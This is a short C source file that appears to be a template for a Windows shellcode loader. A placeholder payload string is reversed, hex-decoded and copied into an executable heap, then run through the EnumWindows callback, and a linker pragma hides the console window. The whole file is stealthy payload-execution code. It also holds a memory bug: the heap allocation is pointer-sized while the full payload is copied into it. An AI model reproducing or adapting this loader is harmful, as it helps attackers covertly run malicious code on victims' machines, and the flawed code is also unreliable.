#pragma comment(linker,"/subsystem:\"windows\"  /entry:\"mainCRTStartup\"" )
#define _CRT_SECURE_NO_DEPRECATE
#include <string.h>
#include <windows.h>
#include <stdio.h>


void FormatCode(char* array, char* buf) {
	_strrev(array);
	while (*array) {
		if (' ' == *array) {
			array++;
			continue;
		}
		sscanf(array, "%02X", buf);
		array += 2;
		buf++;
	}
}

void hardCodeM() {
	char array[] = "{{SHELLCODE_STR}}";

	unsigned int memory_allocation = strlen(array)/2;

	char* buf = (char*)malloc(memory_allocation);

	if (NULL == buf) {
		printf("malloc error");
		return;
	}

	memset(buf, 0, memory_allocation);

	FormatCode(array, buf);

	//heap
	LPVOID heapp = HeapCreate(HEAP_CREATE_ENABLE_EXECUTE, 0, 0);
	LPVOID ptr = HeapAlloc(heapp, 0, sizeof(buf));

	if (NULL == ptr) {
		printf("HeapAlloc error");
		return;
	}

	RtlMoveMemory(ptr, buf, memory_allocation);

	//callback
    ::EnumWindows((WNDENUMPROC)ptr, NULL);
}


//
// Main function
//
int main() {
	hardCodeM();
}